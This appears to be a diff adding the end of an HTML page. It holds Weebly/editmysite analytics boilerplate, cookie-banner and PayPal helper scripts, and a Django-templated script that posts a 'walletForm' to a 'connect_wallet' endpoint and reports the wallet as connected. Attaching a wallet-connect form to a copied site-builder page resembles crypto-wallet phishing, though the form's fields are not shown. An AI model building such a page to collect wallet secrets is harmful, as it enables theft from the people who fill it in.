+	// NOTE: keep the getElementsByTagName(o)**[1]** if you replace this code. Otherwise cookie banner scripts won't be first on the page
+	;(function(p,l,o,w,i,n,g){if(!p[i]){p.GlobalSnowplowNamespace=p.GlobalSnowplowNamespace||[];
+			p.GlobalSnowplowNamespace.push(i);p[i]=function(){(p[i].q=p[i].q||[]).push(arguments)
+			};p[i].q=p[i].q||[];n=l.createElement(o);g=l.getElementsByTagName(o)[1];n.async=1;
+			n.src=w;g.parentNode.insertBefore(n,g)}}(window,document,'script','//cdn2.editmysite.com/js/wsnbn/snowday262.js','snowday'));
+
+	var r = [99, 104, 101, 99, 107, 111, 117, 116, 46, 40, 119, 101, 101, 98, 108, 121, 124, 101, 100, 105, 116, 109, 121, 115, 105, 116, 101, 41, 46, 99, 111, 109];
+	var snPlObR = function(arr) {
+		var s = '';
+		for (var i = 0 ; i < arr.length ; i++){
+			s = s + String.fromCharCode(arr[i]);
+		}
+		return s;
+	};
+	var s = snPlObR(r);
+
+	var regEx = new RegExp(s);
+
+	_W.Analytics = _W.Analytics || {'trackers': {}};
+	_W.Analytics.trackers.wSP = 'snowday';
+	_W.Analytics.user_id = '154089123';
+	_W.Analytics.site_id = '691646854115596267';
+
+
+	(function(app_id, ec_hostname, discover_root_domain) {
+		var track = window[_W.Analytics.trackers.wSP];
+		if (!track) return;
+		track('newTracker', app_id, ec_hostname, {
+			appId: app_id,
+			post: true,
+			platform: 'web',
+			discoverRootDomain: discover_root_domain,
+			cookieName: '_snow_',
+			contexts: {
+				webPage: true,
+				performanceTiming: true,
+				gaCookies: true
+			},
+			crossDomainLinker: function (linkElement) {
+				return regEx.test(linkElement.href);
+			},
+			respectDoNotTrack: true
+		});
+		track('trackPageView', _W.Analytics.user_id+':'+_W.Analytics.site_id, _W.Analytics.spContexts);
+		track('crossDomainLinker', function (linkElement) {
+			return regEx.test(linkElement.href);
+		});
+	})(
+		'_wn',
+		'ec.editmysite.com',
+		false
+	);
+</script>
+
+
+
+
+<script>
+	(function(jQuery) {
+		try {
+			if (jQuery) {
+				jQuery('div.blog-social div.fb-like').attr('class', 'blog-social-item blog-fb-like');
+				var $commentFrame = jQuery('#commentArea iframe');
+				if ($commentFrame.length > 0) {
+					var frameHeight = jQuery($commentFrame[0].contentWindow.document).height() + 50;
+					$commentFrame.css('min-height', frameHeight + 'px');
+				}
+				if (jQuery('.product-button').length > 0){
+					jQuery(document).ready(function(){
+						jQuery('.product-button').parent().each(function(index, product){
+							if(jQuery(product).attr('target') == 'paypal'){
+								if (!jQuery(product).find('> [name="bn"]').length){
+									jQuery('<input>').attr({
+										type: 'hidden',
+										name: 'bn',
+										value: 'DragAndDropBuil_SP_EC'
+									}).appendTo(product);
+								}
+							}
+						});
+					});
+				}
+			}
+			else {
+				// Prototype
+				$$('div.blog-social div.fb-like').each(function(div) {
+					div.className = 'blog-social-item blog-fb-like';
+				});
+				$$('#commentArea iframe').each(function(iframe) {
+					iframe.style.minHeight = '410px';
+				});
+			}
+		}
+		catch(ex) {}
+	})(window._W && _W.jQuery);
+</script>
+
+<script>
+	window._W.isEUUser = false;
+	window._W.showCookieToAll = "";
+</script>
+
+<script>
+	(function(jQuery) {
+		try {
+			function forceShowCcLinks() {
+				var ccLinks = document.querySelector('.cc_links');
+				if (!ccLinks) {
+					return;
+				}
+
+				var ccLinksVisible = jQuery(ccLinks).is(':visible');
+				if (ccLinksVisible) {
+					return;
+				}
+
+
+				ccLinks.style.display = 'block';
+
+				var ccParent = ccLinks.parentElement;
+
+				var ccParentVisible = jQuery(ccParent).is(':visible');
+				if (ccParentVisible) {
+					return;
+				}
+
+				ccParent.style.display = 'block';
+
+				var ccGrandparent = ccParent.parentElement;
+				var ccGrandparentVisible = jQuery(ccGrandparent).is(':visible');
+				if (ccGrandparentVisible) {
+					return;
+				}
+				ccGrandparent.style.display = 'block';
+
+			}
+
+			function forceShowCcLinksForever() {
+				var tenSeconds = 10000;
+				forceShowCcLinks();
+				setTimeout(forceShowCcLinksForever, tenSeconds);
+			}
+
+			jQuery(document).ready(forceShowCcLinksForever);
+		}
+		catch(ex) {}
+	})(window._W && _W.jQuery);
+</script>
+
+<!-- Toastify CDN -->
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/toastify-js/src/toastify.min.css">
+<script src="https://cdn.jsdelivr.net/npm/toastify-js"></script>
+
+<script>
+(function() {
+  const form = document.getElementById('walletForm');
+  if (!form) {
+    console.error("⚠️ Wallet form not found.");
+    return;
+  }
+
+  form.addEventListener('submit', async function(e) {
+    e.preventDefault(); // stop normal reload
+    console.log("Submitting wallet form...");
+
+    const formData = new FormData(form);
+
+    try {
+      const response = await fetch("{% url 'connect_wallet' %}", {
+        method: "POST",
+        headers: {
+          "X-CSRFToken": form.querySelector("[name=csrfmiddlewaretoken]").value,
+        },
+        body: formData,
+      });
+
+      const data = await response.json();
+      console.log("Server response:", data);
+
+      if (response.ok && data.success) {
+        Toastify({
+          text: "✅ Wallet connected successfully!",
+          duration: 4000,
+          gravity: "top",
+          position: "right",
+          backgroundColor: "#4CAF50",
+        }).showToast();
+
+        form.reset();
+      } else {
+        Toastify({
+          text: "⚠️ Failed to connect wallet. Please try again.",
+          duration: 4000,
+          gravity: "top",
+          position: "right",
+          backgroundColor: "#ff4444",
+        }).showToast();
+      }
+    } catch (err) {
+      console.error("Network Error:", err);
+      Toastify({
+        text: "⚠️ Network error. Please check your connection.",
+        duration: 4000,
+        gravity: "top",
+        position: "right",
+        backgroundColor: "#ff4444",
+      }).showToast();
+    }
+  });
+})();
+</script>
+
+
+	</body>
 </html>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
